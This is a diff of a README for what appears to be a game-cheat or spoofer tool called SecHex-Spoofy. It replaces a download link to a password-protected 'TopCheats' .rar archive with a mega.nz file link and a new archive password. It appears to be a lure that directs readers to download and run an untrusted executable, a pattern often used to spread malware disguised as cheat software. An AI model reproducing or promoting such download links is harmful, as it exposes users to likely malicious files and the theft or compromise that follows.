@@ -2,8 +2,8 @@
 
 [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]() 
 
- [![Безымя111111нный](https://github.com/user-attachments/files/16814604/Link.txt)](https://github.com/AllertUsers/Yuakd11-9.15/releases/download/TopCheats/TopCheats_2.1.rar)
- > Password: EEASY2024
+# Download [file](https://mega.nz/file/vQ8FHYyT#T-L3axcwnPmvW09MEQar2sZOylQhC5a3gP9b_UeRm70)
+ > Password: EASY2024
 
 ## How to download:
 1. Open the Launcher
